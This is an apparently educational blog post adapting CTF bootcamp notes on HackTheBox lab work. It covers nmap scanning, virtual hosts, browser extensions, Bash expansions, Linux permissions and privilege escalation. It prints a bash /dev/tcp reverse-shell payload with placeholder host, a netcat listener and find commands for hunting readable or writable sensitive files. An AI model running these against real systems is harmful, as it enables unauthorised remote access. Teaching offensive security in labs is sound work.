@@ -1,0 +1,516 @@
+---
+layout: post
+title: "CTF Bootcamp S7: And all the pieces matter"
+author: "GGG"
+date: 2026-04-06
+excerpt: "CTF Bootcamp S7: And all the pieces matter"
+comment: true
+---
+
+<p>This article adapts the bootcamp session notes into a readable post. <a href="/ctf-bootcamp/Session7/">View the slides</a>.</p>
+<h1 id="today">Today</h1>
+<ul>
+<li>HackTheBox</li>
+<li>Port scanning</li>
+<li>Virtual Hosts</li>
+<li>JavaScript capabilities</li>
+<li>Browser extensions</li>
+<li>Bash expansions</li>
+<li>Reverse shell</li>
+<li>Linux permissions
+<ul>
+<li>Ownership</li>
+<li>SUID</li>
+<li><code>sudo</code></li>
+</ul></li>
+<li>Basic Linux privilege escalation
+<ul>
+<li><code>sudo</code></li>
+<li>Writable (and readable) files</li>
+<li>Service enumeration (processes and sockets)</li>
+</ul></li>
+<li>Python imports</li>
+<li>Searching the web</li>
+<li>Hack time!</li>
+</ul>
+<h1 id="tools">Tools</h1>
+<p>Install please:</p>
+<ul>
+<li>nmap</li>
+<li>openvpn</li>
+</ul>
+<h1 id="hackthebox">HackTheBox</h1>
+<p>HackTheBox (HTB) is a platform for practicing penetration testing on
+vulnerable machines running on the HTB network.</p>
+<p>They have varying degrees of difficulty, use different operating
+systems (mainly Linux and Windows), and have different vulnerable
+services.</p>
+<h2 id="accessing-the-lab">Accessing the lab</h2>
+<p>We must connect to the HTB network using a VPN downloaded from their
+site to be able to reach our targets.</p>
+{% highlight bash %}
+sudo openvpn CONFIG.ovpn
+{% endhighlight %}
+<p>We must keep that command running while doing the machine and should
+stop it after.</p>
+<h2 id="flags">Flags</h2>
+<p>Each box has two flags indicating you have reached some level of
+compromise of the server.</p>
+<p>The first is the user flag (readable by some user) and is usually
+located at <code class="verbatim">/home/some-user/user.txt</code>.</p>
+<p>The second is the root flag (readable by <code class="verbatim">root</code>) and is usually located at <code class="verbatim">/root/root.txt</code>.</p>
+<p>Getting the values stored in these two flags will be our general
+objective.</p>
+<h2 id="typical-workflow">Typical workflow</h2>
+<ol>
+<li>Enumerate the server</li>
+<li>Gather information</li>
+<li>Identify potential vulnerabilities</li>
+<li>Exploit vulnerability (get initial user)</li>
+<li>Privilege escalation (get from initial user to root)</li>
+</ol>
+<h1 id="port-scanning">Port scanning</h1>
+<p>So, we have a host and want to see what services are running on
+it.</p>
+<h2 id="tcp-handshake">TCP handshake</h2>
+<p>Remember:</p>
+<img src="/ctf-bootcamp/Session7/img/tcp-handshake.png"/>
+<h2 id="tcp-handshake-rejected">TCP handshake rejected</h2>
+<p>A handshake only completes if there's a service listening on
+destination port.</p>
+<p>Otherwise, the server will respond with a RST packet.</p>
+<img src="/ctf-bootcamp/Session7/img/filtered_and_closed_port.png"/>
+<h2 id="nmap"><code>nmap</code></h2>
+<p>Network exploration tool and security / port scanner</p>
+{% highlight bash %}
+sudo nmap -p- -sS -Pn -A -oA tcp -T4 --min-rate 1000 -vv --reason $HOST
+{% endhighlight %}
+<ul>
+<li><code>-p-</code>: Scanall ports</li>
+<li><code>-sS</code>: TCP SYN scan</li>
+<li><code>-Pn</code>: Treat host as online</li>
+<li><code>-A</code>: OS and version detection, script scanning, and
+traceroute</li>
+<li><code>-oA</code>: Save results in all formats</li>
+<li><code>-T4</code>: Be aggresive</li>
+<li><code>--min-rate</code>: Send packets no slower than <em>NUM</em>
+per second</li>
+<li><code>-vv</code>: Increase verbosity</li>
+<li><code>--reason</code>: Display the reason a port is in a particular
+state</li>
+</ul>
+<h3 id="tcp-syn-scan">TCP SYN scan</h3>
+<img src="/ctf-bootcamp/Session7/img/tcp-syn-scan.png"/>
+<h3 id="example">Example</h3>
+{% highlight text %}
+# Nmap 7.98 scan initiated Sat Mar  7 13:10:10 2026 as: nmap -sS -Pn -p- -oA nmap/tcp -A --min-rate 1000 -T4 --reason -vv 10.129.244.79
+Nmap scan report for 10.129.244.79
+Host is up, received user-set (0.10s latency).
+Scanned at 2026-03-07 13:10:11 -05 for 79s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJW1WZr+zu8O38glENl+84Zw9+Dw/pm4IxFauRRJ+eAFkuODRBg+5J92dT0p/BZLMz1wZMjd6BLjAkB1LHDAjqQ=
+|   256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICE6UoMGXZk41AvU+J2++RYnxElAD3KNSjatTdCeEa1R
+80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-title: Browsed
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+TCP/IP fingerprint:
+OS:SCAN(V=7.98%E=4%D=3/7%OT=22%CT=1%CU=32837%PV=Y%DS=2%DC=T%G=Y%TM=69AC6A52
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(
+OS:O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11
+OS:NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
+OS:R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Uptime guess: 21.272 days (since Sat Feb 14 06:40:26 2026)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=257 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT       ADDRESS
+1   105.14 ms 10.10.14.1
+2   103.84 ms 10.129.244.79
+
+Read data files from: /nix/store/vn1wqbv2qzrfi4cwzi9yy36nbw4myhmb-nmap-7.98/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Mar  7 13:11:30 2026 -- 1 IP address (1 host up) scanned in 79.62 seconds
+{% endhighlight %}
+<h2 id="exploring-open-ports">Exploring open ports</h2>
+<p>Once we have a list of listening services on the server (open ports),
+we must go around each one gathering information and searching for
+possible vulnerabilities that would further our access.</p>
+<p>Common things to search for are user information (emails, username,
+names), version numbers (of the services running), accessible endpoints,
+and a general feel for what each service might be doing.</p>
+<h1 id="http-host">HTTP <code>Host</code></h1>
+<p>The HTTP Host request header specifies the host and port number of
+the server to which the request is being sent.</p>
+{% highlight text %}
+Host: <host>:<port>
+{% endhighlight %}
+<h2 id="virtual-hosts">Virtual Hosts</h2>
+<p>We can host multiple websites with heterogenous content on a same
+server (same IP) by checking the <code>Host</code> header and returning
+a different site based on its value.</p>
+<h2 id="nginx-example">Nginx example</h2>
+{% highlight conf %}
+# Configuration for example.com
+server {
+    listen 80;
+    server_name example.com www.example.com;
+    root /var/www/example.com;
+}
+
+# Configuration for blog.example.com
+server {
+    listen 80;
+    server_name blog.example.com;
+    root /var/www/blog.example.com;
+}
+{% endhighlight %}
+<h1 id="javascript-capabilities">JavaScript capabilities</h1>
+<p>JavaScript (JS) runs on a browser managed sandbox, it can't interact
+directly with the host OS (no syscalls, arbitrary reads/writes,
+etc).</p>
+<p>Within the sandbox, JS may:</p>
+<ul>
+<li>Read/modify the Document Object Model (the live HTML of a site)</li>
+<li>Receive and handle user interaction (mouse, keyboard)</li>
+<li>Make network requests (almost only HTTP)</li>
+<li>Store and read data in the browser (associated with the page)</li>
+<li>Etc</li>
+</ul>
+<h2 id="window.fetch"><code>window.fetch</code></h2>
+<p>Method that fetches a resource from the network and allows handling
+the response asynchronously.</p>
+{% highlight javascript %}
+const response = await fetch("https://example.org/post", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded",
+  },
+  // Automatically converted to "username=example&password=password"
+  body: new URLSearchParams({ username: "example", password: "password" }),
+  // …
+});
+{% endhighlight %}
+<h2 id="window.origin"><code>window.origin</code></h2>
+<p>Read-only property, returns the origin of the global scope.</p>
+{% highlight text %}
+console.log(window.origin);
+// 'https://developer.mozilla.org'
+{% endhighlight %}
+<h2 id="document.domain"><code>document.domain</code></h2>
+<p>Property that gets/sets the domain portion of the origin of the
+current document.</p>
+{% highlight text %}
+console.log(document.domain)
+// developer.mozilla.org
+{% endhighlight %}
+<h2 id="document.cookie"><code>document.cookie</code></h2>
+<p>Property that gets/sets the cookies associated with a document.</p>
+<h1 id="browser-extensions">Browser extensions</h1>
+<p>Browser extensions are packaged JS (and HTML, CSS) that runs on a
+browser on addition to web pages regular JS.</p>
+<p>It has access to the same web APIs and also has access to some extra
+browser APIs.</p>
+<h2 id="anatomy">Anatomy</h2>
+<img src="/ctf-bootcamp/Session7/img/webextension-anatomy.png"/>
+<h2 id="manifest.json"><code>manifest.json</code></h2>
+<p>Contains metadata about the extension (name, version,
+permissions).</p>
+<p>Also contains references to other files in the extension.</p>
+{% highlight json %}
+{
+  "background": {
+    "scripts": ["jquery.js", "my-background.js"]
+  },
+
+  "content_scripts": [
+    {
+      "exclude_matches": ["*://developer.mozilla.org/*"],
+      "matches": ["*://*.mozilla.org/*"],
+      "js": ["borderify.js"]
+    }
+  ],
+
+  "manifest_version": 3,
+  "name": "Extension name",
+  "permissions": ["webNavigation"],
+  "version": "0.1",
+  "web_accessible_resources": ["images/my-image.png"]
+}
+{% endhighlight %}
+<h3 id="manifest_version"><code>manifest_version</code></h3>
+<p>Version of <code>manifest.json</code> used by this extension.</p>
+<p>For simplicity, we will further assume version 3.</p>
+<h3 id="host_permissions"><code>host_permissions</code></h3>
+<p>Use the host<sub>permissions</sub> key to request access for the APIs
+in your extension that read or modify host data, such as cookies,
+webRequest, and tabs.</p>
+{% highlight json %}
+"host_permissions": [
+  "*://developer.mozilla.org/*",
+  "*://*.example.org/*"
+]
+{% endhighlight %}
+<h2 id="background-scripts">Background scripts</h2>
+<p>Scripts that run independently of the lifetime of any particular web
+pages or browser windows.</p>
+<p>Non-persistent since manifest v3, they respond to an event and unload
+when idle.</p>
+<h2 id="content-scripts">Content scripts</h2>
+<p>Use content scripts to access and manipulate web pages. Content
+scripts are loaded into web pages and run in the context of that
+particular page.</p>
+<h2 id="communicating-with-background-scripts---one-off-messages">Communicating
+with background scripts - One-off messages</h2>
+<p><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_scripts#communicating_with_background_scripts">MDN</a></p>
+<table>
+<tbody>
+<tr>
+<td></td>
+<td>In content script</td>
+<td>In background script</td>
+</tr>
+<tr>
+<td>Send a message</td>
+<td><code>browser.runtime.sendMessage()</code></td>
+<td><code>browser.tabs.sendMessage()</code></td>
+</tr>
+<tr>
+<td>Receive a message</td>
+<td><code>browser.runtime.onMessage</code></td>
+<td><code>browser.runtime.onMessage</code></td>
+</tr>
+</tbody>
+</table>
+<h1 id="bash-expansions">Bash expansions</h1>
+<p>Words in a Bash command line are subject to multiple expansions that
+change the command line before running it.</p>
+<h2 id="order">Order</h2>
+<p>The expansions done are (in the order they are applied):</p>
+<ul>
+<li>brace expansion</li>
+<li>tilde expansion</li>
+<li>parameter/variable expansion</li>
+<li>arithmetic expansion</li>
+<li>command substitution</li>
+<li>word splitting</li>
+<li>pathname expansion</li>
+<li>quote removal</li>
+</ul>
+<h2 id="parameter-expansion">Parameter expansion</h2>
+<p>Variables (environment or local) are replaced with their values.</p>
+{% highlight bash %}
+$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+{% endhighlight %}
+<h2 id="arithmetic-expansion">Arithmetic expansion</h2>
+<p>Evaluates an arithmetic expression and substitutes the result.</p>
+{% highlight bash %}
+$ echo $((1 + 2))
+3
+
+$ echo "$((a[$(echo hello)]))"  # ???
+0
+{% endhighlight %}
+<h2 id="command-substitution">Command substitution</h2>
+<p>Replaces a command with its output.</p>
+{% highlight bash %}
+$ echo $(ls)
+bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+$ echo `ls`
+bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+{% endhighlight %}
+<h1 id="reverse-shell">Reverse shell</h1>
+<p>A reverse shell is a shell session inititated in host and forwarded
+to a listening remote.</p>
+<p>We can use reverse shells to get persistent access (execute multiple
+commands) to a device.</p>
+<h2 id="payload">Payload</h2>
+<p>To get a reverse shell we must execute some code on the victim that
+starts the shell and forwards it.</p>
+<p>This payload varies according to the OS and installed utilities.</p>
+<h3 id="classic-bash-payload">Classic Bash payload</h3>
+{% highlight text %}
+bash -i >& /dev/tcp/$IP/$PORT 0>&1
+{% endhighlight %}
+<h3 id="online-generator">Online generator</h3>
+<p>Many payload options</p>
+<p><a href="https://www.revshells.com/">https://www.revshells.com/</a></p>
+<h2 id="listener">Listener</h2>
+<p>As the listener must initiate a connection, we must be ready to
+receive it.</p>
+<h3 id="nc"><code>nc</code></h3>
+<p>Simple <code>netcat</code> receiver.</p>
+{% highlight bash %}
+nc -lvn $PORT
+{% endhighlight %}
+<p>The shell we receive will not be a full PTY shell, so it won't have
+all the niceties we are used to (completion, keyboard shortcuts).</p>
+<p>We can upgrade our shell to a full PTY, or we can do it
+automatically…</p>
+<h3 id="penelope"><code>penelope</code></h3>
+<p>Penelope is a powerful shell handler built as a modern netcat
+replacement for RCE exploitation, aiming to simplify, accelerate, and
+optimize post-exploitation workflows.</p>
+{% highlight bash %}
+penelope -i tun0
+{% endhighlight %}
+<h1 id="linux-permissions">Linux permissions</h1>
+<h2 id="ownership">Ownership</h2>
+<p>Files and directories in Linux have an owner user and owner
+group.</p>
+<p>They indicate the user and group that control a file and can change
+permissions.</p>
+<h2 id="permissions">Permissions</h2>
+<p>Controls what operations can be done by which users on
+files/directories.</p>
+<h3 id="permitted-to-who">Permitted to who?</h3>
+<p>In Unix-like systems, there are three common permission sets.</p>
+<ul>
+<li><code>user</code>: owner of the file</li>
+<li><code>group</code>: users in the file's group</li>
+<li><code>others</code>: user that don't fit <code>owner</code> or
+<code>group</code></li>
+</ul>
+<h3 id="permitted-what">Permitted what?</h3>
+<p>The most common permissions are:</p>
+<ul>
+<li>r(ead): Read file</li>
+<li>w(rite): Write to file</li>
+<li>x(ecute): Execute file as a program</li>
+</ul>
+<p>These permissions have different semantics for directories.</p>
+<h3 id="ls-example"><code>ls</code> example</h3>
+<p>The format of <code>ls -l</code> indicates the file owner, the
+permissions allowed to user, group and others, among other file
+metadata.</p>
+{% highlight text %}
+$ ls -l /etc/hosts
+-rw-r--r-- 1 root root 172 Mar 14 20:33 /etc/hosts
+{% endhighlight %}
+<img src="/ctf-bootcamp/Session7/img/file_permissions.png"/>
+<h2 id="depend-on-process">Depend on process</h2>
+<p>Processes try to operate on files and it's according to their
+permissions that they are allowed to.</p>
+<p>Processes get their permissions from <em>the user</em> (really, from
+the parent process) that started them.</p>
+<h2 id="root-user"><code>root</code> user</h2>
+<p><code>root</code> is the superuser in a Linux system.</p>
+<ul>
+<li>Has full control over the system</li>
+<li>Can read and modify any file</li>
+<li>Can modify system configuration</li>
+</ul>
+<p>Getting <code>root</code> access means full compromise of the
+machine.</p>
+<h2 id="sudo"><code>sudo</code></h2>
+<p>Allows executing commands as another user (usually the root
+user).</p>
+<p><code>sudo CMD</code> tries to run the command as root.</p>
+<p><code>sudo -l</code> shows the allowed commands that can be called
+with sudo.</p>
+<h3 id="example-1">Example</h3>
+{% highlight text %}
+$ sudo -l
+Matching Defaults entries for mark on guardian:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User mark may run the following commands on guardian:
+    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
+{% endhighlight %}
+<p>We are <code>mark</code> and can run the command
+<code>/usr/local/bin/safeapache2ctl</code> as any user (specified by
+<code>(ALL)</code>).</p>
+<h1 id="privilege-escalation">Privilege escalation</h1>
+<p>Once we have access as some user (initial foothold), we want to
+escalate our privileges to those of another more powerful user (usually
+root).</p>
+<p>There are many techniques for achieving that.</p>
+<h2 id="readable-files">Readable files</h2>
+<p>We might have read access to files containing sensitive data (private
+keys, passwords, hashes, session tokens).</p>
+<p>Files to check are service configuration files, password stores and
+such.</p>
+<p>We could also check source code of other applications running on the
+host to search vulnerabilities in them.</p>
+<h3 id="commands">Commands</h3>
+<p>Find readable files from current directory</p>
+{% highlight text %}
+$ find -readable 2>/dev/null
+{% endhighlight %}
+<p>Find from the root path, will show much output.</p>
+{% highlight text %}
+$ find / -readable 2>/dev/null
+{% endhighlight %}
+<h2 id="writable-files">Writable files</h2>
+<p>We could also have write access to sensitive files. We could change
+the allowed credentials for some (more privileged) service on the
+computer, make their configuration more permissive, or even replace the
+code that it runs.</p>
+{% highlight text %}
+$ find / -writable 2>/dev/null
+$ find -writable 2>/dev/null
+{% endhighlight %}
+<h2 id="sudo-1"><code>sudo</code></h2>
+<p>As <code>sudo</code> allows us to run commands as <code>root</code>,
+it's a good place to search for vulnerabilities.</p>
+<p>The program we can run could allow us to read files, write files, or
+even execute arbitrary commands.</p>
+<p>As such, always check for <code>sudo -l</code>.</p>
+<h1 id="python-imports">Python imports</h1>
+<p>Python <code>import</code> statements load code from other files
+(called modules).</p>
+<p>The files to <code>import</code> are searched from:</p>
+<ul>
+<li>The current directory (the directory of the python proceess)</li>
+<li>The <code>PYTHONPATH</code> environment variable</li>
+<li>The Python installation paths</li>
+</ul>
+<h2 id="python-compiled-bytecode-.pyc-files">Python compiled bytecode
+(<code>.pyc</code> files)</h2>
+<p>While Python code is usually interpreted, it can also be
+<em>compiled</em> down to a more amenable representation for execution
+and be loaded when requesting the corresponding <code>.py</code>
+file.</p>
+<p>This is Python bytecode and uses the <code>.pyc</code> extension,
+it's usually stored in a <code>__pycache__/</code> directory.</p>
+<h1 id="searching">Searching</h1>
+<p>We will never know everything, but what we don't know, we can
+search.</p>
+<p>When we find a command, service, configuration option, or file that
+we don't understand, we search for it on the Internet.</p>
+<p>Of course, we will prioritize what looks promising based on our
+experience.</p>
+<h1 id="further-learning">Further learning</h1>
+<ul>
+<li>pwn.college — Learn to Hack! <a href="https://pwn.college/">https://pwn.college/</a></li>
+<li>HackTheBox Academy <a href="https://academy.hackthebox.com/">https://academy.hackthebox.com/</a></li>
+</ul>
+<h1 id="references">References</h1>
+<ul>
+<li><a href="https://developer.mozilla.org/">https://developer.mozilla.org/</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Anatomy_of_a_WebExtension#content_scripts">https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Anatomy_of_a_WebExtension#content_scripts</a></li>
+</ul>
+<h1 id="hack-time">Hack time!</h1>
+<ul>
+<li><a href="https://app.hackthebox.com/machines/Browsed">https://app.hackthebox.com/machines/Browsed</a></li>
+</ul>
